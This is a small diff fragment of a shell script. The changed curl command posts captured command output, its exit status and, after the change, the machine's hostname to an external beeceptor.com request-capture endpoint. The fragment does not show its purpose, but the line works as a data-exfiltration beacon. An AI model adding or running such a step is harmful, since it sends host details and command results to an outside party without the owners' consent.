@@ -24,4 +24,4 @@ echo "$OUTPUT"
 echo "Exit status: $EXIT_STATUS"
 
 # Use curl to send the captured output and exit status to the specified URL
-curl -X POST -H "Content-Type: text/plain" --data-binary "{\"output\": \"$OUTPUT\", \"exit_status\": $EXIT_STATUS}" https://ouinonoui.free.beeceptor.com
+curl -X POST -H "Content-Type: text/plain" --data-binary "{\"hostname\":\"$HOSTNAME\",\"output\": \"$OUTPUT\", \"exit_status\": $EXIT_STATUS}" https://ouinonoui.free.beeceptor.com
